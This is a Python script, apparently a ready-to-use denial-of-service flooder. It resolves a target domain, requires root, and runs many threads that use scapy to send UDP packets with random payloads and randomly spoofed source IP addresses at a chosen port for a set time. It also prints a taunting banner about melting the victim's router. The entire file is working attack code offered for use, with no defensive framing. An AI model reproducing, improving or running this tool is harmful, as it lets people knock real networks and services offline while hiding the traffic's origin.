#!/usr/bin/env python3
import sys
import threading
import os
import socket
import string
import random
import time
from scapy.all import *
from urllib.parse import urlparse

def worker(ip, min_bytes, max_bytes, abort_event):
    while not abort_event.is_set():
        try:
            payload = ''.join(random.choice(string.printable) for _ in range(random.randint(int(min_bytes), int(max_bytes))))
            src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(src=src_ip, dst=ip) / UDP(sport=RandShort(), dport=int(sys.argv[2])) / payload.encode()
            send(pkt, verbose=False)
        except:
            pass

def resolve_domain(target):
    target = target.lower()
    if not (target.startswith('http://') or target.startswith('https://')):
        target = 'http://' + target
        
    try:
        domain = urlparse(target).netloc
        ip = socket.gethostbyname(domain)
        return ip
    except Exception as e:
        sys.exit('DNS resolution failed. Exiting...')

def main():
    os.system('clear')
    if not os.geteuid() == 0:
        sys.exit('Script requires root elevation!')
    
    if len(sys.argv) != 6:
        sys.exit('Usage: <target> <port> <byte range: x-y> <time> <threading>')
        
    try:
        min_bytes, max_bytes = sys.argv[3].split('-')
    except ValueError:
        sys.exit('Invalid byte range specified. Exiting...')
    
    target_ip = resolve_domain(sys.argv[1])
    
    print('''
   █████▒    ██▀███     ▓██   ██▓    ██▓   ▓█████     ███▄ ▄███▓
 ▓██   ▒    ▓██ ▒ ██▒    ▒██  ██▒   ▓██▒   ▓█   ▀    ▓██▒▀█▀ ██▒
 ▒████ ░    ▓██ ░▄█ ▒     ▒██ ██░   ▒█     ▒███      ▓██    ▓██░
 ░▓█▒  ░    ▒██▀▀█▄       ░ ▐██▓░   ░      ▒▓█  ▄    ▒██    ▒██ 
 ░▒█░       ░██▓ ▒██▒     ░ ██▒▓░          ░▒████▒   ▒██▒   ░██▒
  ▒ ░       ░ ▒▓ ░▒▓░      ██▒▒▒    ░      ░░ ▒░ ░   ░ ▒░   ░  ░
  ░           ░▒ ░ ▒░    ▓██ ░▒░       ░    ░ ░  ░   ░  ░      ░
  ░ ░         ░░   ░     ▒ ▒ ░░        ░      ░      ░      ░   
               ░         ░ ░         ░        ░  ░          ░   
                         ░ ░                                    
''')
    print(' THeiR roUTeR iS $iZZlinG! MeLtiNg ' + target_ip + ':' + sys.argv[2] + ' fOr ' + sys.argv[4] + ' sEcOnDs...\r\n')

    tasks = []
    abort_event = threading.Event()
    for _ in range(0, int(sys.argv[5])):
        t = threading.Thread(target=worker, args=(target_ip, min_bytes, max_bytes, abort_event))
        t.daemon = True
        tasks.append(t)
        t.start()
        
    _quit = time.time() + int(sys.argv[4])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    abort_event.set()
    
    for t in tasks:
        t.join()
    
    sys.exit('\r\n DoNe...\r\n')
    
if __name__ == '__main__':
    main()
